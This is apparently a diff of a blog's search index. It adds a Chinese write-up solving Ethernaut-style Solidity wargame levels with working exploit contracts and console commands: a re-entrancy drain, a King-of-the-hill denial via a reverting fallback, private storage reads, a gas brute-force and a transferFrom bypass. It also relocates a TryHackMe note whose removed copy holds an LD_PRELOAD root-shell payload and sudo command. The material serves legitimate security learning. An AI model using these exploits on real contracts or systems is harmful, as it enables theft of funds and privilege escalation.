+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =ø= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br></pre></td></tr></table></figure>
+<p>在solidity裡面，如果在同一個net內，可以利用selfdestruct(addr)的方法將錢強制轉到地址addr，所以有了以下攻擊服務：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleWallet &#123;</span><br><span class="line">    event Deposit(address indexed sender, uint amount);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        address payable addr = payable(address(0x52C5746DA9D2Ebd076e06A3F99D3415132AA4129));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先透過deposit轉入 1 wei 的錢，再利用attack函數觸發selfdestruct即可。  </p>
+<p><img src="https://hackmd.io/_uploads/rJFkZ1tJJl.png" alt="image">  </p>
+<h2 id="Level-8-Vault"><a href="#Level-8-Vault" class="headerlink" title="Level 8 Vault"></a>Level 8 Vault</h2><p>任務：  </p>
+<ol>
+<li>送出正確的密碼</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在solidity中，把一個變數設為private僅代表它不會被其他合約調用，不等於查不到。<br>尋找方法（Remix IDE console）：  </p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SyEJsgKyJe.png" alt="image">  </p>
+<p>拿到ㄌXD，透過unlock函數送回去即可。  </p>
+<h2 id="Level-9-King"><a href="#Level-9-King" class="headerlink" title="Level 9 King"></a>Level 9 King</h2><p>Victim’s address: 0xa0E4564E6bb136c3563af930Fcd6f6ebBf8a6729<br>任務：  </p>
+<ol>
+<li>讓別人無法再轉帳進來</li>
+</ol>
+<p>這個合約會訂定一個prize的值，如果你想成為King，你需要轉入大於prize的一筆錢，而你可以獲取以前的prize金額（<del>龐氏騙局來著</del>）  </p>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>solidity裡面的transfer中，如果調用對象的地址是一個合約，那它會依序去觸發<code>receive -&gt; fallback</code>  </p>
+<p>然而，今天如果攻擊者合約的fallback函數是壞掉的，並在一開始去轉帳佔領了目前King的身分，將會導致其他用戶無法轉帳成功並成為新的King。  </p>
+<p><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleWallet &#123;</span><br><span class="line">    event Deposit(address indexed sender, uint amount);</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        address payable addr = payable(address(0xa0E4564E6bb136c3563af930Fcd6f6ebBf8a6729));</span><br><span class="line">        (bool success, ) = addr.call&#123;value: 1000000000000001&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        require(false);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一樣部署在Remix IDE，先用deposit函數幫它充值一下再透過attack轉帳到Victim那  </p>
+<h2 id="Level-10-Re-entrancy"><a href="#Level-10-Re-entrancy" class="headerlink" title="Level 10 Re-entrancy"></a>Level 10 Re-entrancy</h2><p>Victim’s address: 0x1A1D0331408f581F2566B57a2456286171d7F0a1<br>任務：  </p>
+<ol>
+<li>把所有錢領走</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>重入攻擊</strong><br>(Re-entrancy Attack)，如上面的程式所示，withdraw函數是先用call把錢轉入對方帳戶再確認ammount，聽起來很正常…<br>但今天如果轉入的帳戶地址是一個合約，並且fallback函數（承上題知識點：call進來的時候就會觸發fallback）會再次去請求Victim的withdraw?!  </p>
+<p>瞬間變成不斷卡在提款階段，導致根本沒辦法進行到amount的檢查  </p>
+<p><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Reentrance&#123;</span><br><span class="line">    function donate(address _to) external payable;</span><br><span class="line">    function withdraw(uint _amount) external;</span><br><span class="line">    function balanceOf(address _who) external view returns (uint balance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WhaleWallet &#123;</span><br><span class="line">    Reentrance public victim = Reentrance(0x1A1D0331408f581F2566B57a2456286171d7F0a1);</span><br><span class="line"></span><br><span class="line">    address payable public target = payable(address(0x1A1D0331408f581F2566B57a2456286171d7F0a1));</span><br><span class="line"></span><br><span class="line">    event Deposit(address indexed sender, uint amount);</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        victim.donate&#123;value: 0.0001 ether&#125;(address(this));</span><br><span class="line">        victim.withdraw(0.0001 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        victim.withdraw(0.0001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-11-Elevator"><a href="#Level-11-Elevator" class="headerlink" title="Level 11 Elevator"></a>Level 11 Elevator</h2><p>Victim’s address: 0xcFb281781d8f9a09EE3Ba9C400bCDBF6b284f06a<br>目標：  </p>
+<ol>
+<li>改變 floor 的值  </li>
+<li>top 是 true</li>
+</ol>
+<p><strong>Source Code</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它會去調用發送地址的isLastFloor函數，如果請求結果第一次是false，floor就會被更新，然後top會變成再次請求isLastFloot的結果。  </p>
+<p>想達成任務，只需要寫一個第一次會回傳false，第二次會回傳true的函數即可~  </p>
+<p><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">    function goTo(uint256 _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WhaleHouse&#123;</span><br><span class="line">    uint256 public meow=0;</span><br><span class="line">    Elevator public target = Elevator(0xcFb281781d8f9a09EE3Ba9C400bCDBF6b284f06a);</span><br><span class="line">    function isLastFloor(uint256 floor) payable public returns(bool)&#123;</span><br><span class="line">        if(meow==0)&#123;</span><br><span class="line">            meow=1;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public payable&#123;</span><br><span class="line">        target.goTo(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>deploy好按下attack，最後檢查meow是不是變成1就知道是否通關了！  </p>
+<h2 id="Level-12-Privacy"><a href="#Level-12-Privacy" class="headerlink" title="Level 12 Privacy"></a>Level 12 Privacy</h2><p>Victim’s address: 0x2b7c7D52206360eD5797bB108cD4Ee24e2Daf367<br>任務：  </p>
+<ol>
+<li>拿到密碼通關</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>solidity儲存一格資料（slot）是256bits，編號從1開始。<br>所以一開始的bool locked因為後面接的是uint256的資料ID，會獨自占用一個slot，同理對於ID<br>接著後面三個資料flattening, denomination, awkwardness一起占用一個slot，最後就是data每項自己占用一格。  </p>
+<p>slot table:</p>
+<table>
+<thead>
+<tr>
+<th>index</th>
+<th>contents</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>locked(1 bit)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>ID(256 bits)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>flattening+denomination+awkwardness*(32 bits)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>data[0](256 bits&#x2F;32 bytes)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>data[1](256 bits&#x2F;32 bytes)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>data[2](256 bits&#x2F;32 bytes)</td>
+</tr>
+</tbody></table>
+<p>接下來就跟Level 8的Vault一樣了，取前16bytes資料送出，結案XD  </p>
+<p><code>web3.eth.getStorageAt(&#39;0x2b7c7D52206360eD5797bB108cD4Ee24e2Daf367&#39;, 5)</code></p>
+<p><img src="https://hackmd.io/_uploads/SkBphWaJJl.png" alt="image">  </p>
+<h2 id="Level-13-Gatekeeper-One"><a href="#Level-13-Gatekeeper-One" class="headerlink" title="Level 13 Gatekeeper One"></a>Level 13 Gatekeeper One</h2><p>Victim’s address: 0x7b23B267AC4CC8314a961F5575Ed8a4116cA8d5c<br>My wallet address: 0x4a63cD2DD88C72Bb47Fa8158c9b2be5294D5f05C<br>任務：  </p>
+<ol>
+<li>通過所有gate</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一個gate就是過去tx.origin的繞過，建立一個attack service再由我們錢包發起，EZ<br>第二個gate就是進行爆破，讓gasfee最後可以通過即可。<br>第三個則是要構造通過gate three函數的payload，基本上動腦想想就好ㄌ<br>我是構造<code>0xfaceb00c0000f05C</code>，<code>faceb00c</code>任意換成非零的東西都可以。  </p>
+<p><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function attack_(bytes8 _gateKey) public &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; 1000; i++) &#123;    </span><br><span class="line">            (bool result,) = address(0x7b23B267AC4CC8314a961F5575Ed8a4116cA8d5c).call&#123;gas:i + 8191 * 4&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,_gateKey));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>任務：  </p>
+<ol>
+<li>通過三個gate</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一個gate老招數，中間人<br>第二個gate則是solidity的特性，他會計算地址的程式大小，但solidity不會把coonstructor算入程式大小<br>第三個gate就是簡單拿合約取hash xor即可  </p>
+<p><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">interface GatekeeperTwo&#123;</span><br><span class="line">     function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit&#123;</span><br><span class="line">    constructor(address  target) &#123;</span><br><span class="line">        bytes8 payload = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);</span><br><span class="line">        GatekeeperTwo(target).enter(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-15-Naught-Coin"><a href="#Level-15-Naught-Coin" class="headerlink" title="Level 15 Naught Coin"></a>Level 15 Naught Coin</h2><p>任務：  </p>
+<ol>
+<li>把所有自己的Naught Coin Token轉走</li>
+</ol>
+<p>一個繼承ERC 20的Token合約，可以參考這篇會比較清楚：<a href="https://news.cnyes.com/news/id/4981550">https://news.cnyes.com/news/id/4981550</a>  </p>
+<p>transfer protocol被鎖了，要等十年  </p>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因為他沒有幫transferFrom上鎖，但這在ERC20裡面依然可以轉帳<br>所以使用approve把自己的token領出來-&gt;transferFrom轉到instance帳號即可<br>P.S.記得把自己錢用balenceOf領乾淨w  </p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">balance = <span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>())</span><br><span class="line">contract.<span class="title function_">approve</span>(player, balance)</span><br><span class="line">contract.<span class="title function_">transferFrom</span>(player, instance, balance)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>blockchain</tag>
+        <tag>solidity</tag>
+        <tag>Re-Entrancy Attack</tag>
+        <tag>web3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>First Post</title>
     <url>/2023/08/31/first/</url>
     <content><![CDATA[<h2 id="What’s-going-on"><a href="#What’s-going-on" class="headerlink" title="What’s going on"></a>What’s going on</h2><p>Nothing but my old blog goes wrong…</p>
@@ -2041,28 +2250,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>LD_PRELOAD and Mongo Notes</title>
-    <url>/2023/11/27/ld-preload/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I learned these from <a href="https://tryhackme.com/room/road">Road on TryHackMe</a> today  </p>
-<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p>It usually runs on port <code>27017</code>  </p>
-<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads(?):"></a>payloads(?):</h4><p><strong>Look for working services</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
-<p><strong>MongoDB</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*show databases*/</span><br><span class="line">show db</span><br><span class="line">/*switch to a database*/</span><br><span class="line">use backup # In case the db name is backup</span><br><span class="line">/*list tables*/</span><br><span class="line">show collections</span><br><span class="line">/*read contents in a table*/</span><br><span class="line">db.user.find() # In case the table name is user</span><br></pre></td></tr></table></figure>
-
-<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>LD_PRELOAD is a function allows any program to share libraries.  </p>
-<h4 id="payloads-1"><a href="#payloads-1" class="headerlink" title="payloads:"></a>payloads:</h4><p><strong>shell.c</strong>  </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"> unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>library compilation</strong><br><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br><strong>add LD_PRELOAD with sudo</strong><br><code>sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility</code><br>In case of sudo result like this:<br><img src="https://hackmd.io/_uploads/ByMeS7GHa.png" alt="image">  </p>
-<p><code>env_keep+=LD_PRELOAD</code>  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>LD_PRELOAD</tag>
-        <tag>MongoDB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sagemath lattices 隨筆</title>
     <url>/2023/12/05/lattice-sage/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p><del>絕對不承認這些都是CryptoHackㄉ題目</del><br>就晾在這邊owob<br>遇到坑了？  </p>
@@ -2089,6 +2276,28 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>sagemath</tag>
         <tag>lattices</tag>
         <tag>LLL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LD_PRELOAD and Mongo Notes</title>
+    <url>/2023/11/27/ld-preload/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I learned these from <a href="https://tryhackme.com/room/road">Road on TryHackMe</a> today  </p>
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p>It usually runs on port <code>27017</code>  </p>
+<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads(?):"></a>payloads(?):</h4><p><strong>Look for working services</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
+<p><strong>MongoDB</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*show databases*/</span><br><span class="line">show db</span><br><span class="line">/*switch to a database*/</span><br><span class="line">use backup # In case the db name is backup</span><br><span class="line">/*list tables*/</span><br><span class="line">show collections</span><br><span class="line">/*read contents in a table*/</span><br><span class="line">db.user.find() # In case the table name is user</span><br></pre></td></tr></table></figure>
+
+<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>LD_PRELOAD is a function allows any program to share libraries.  </p>
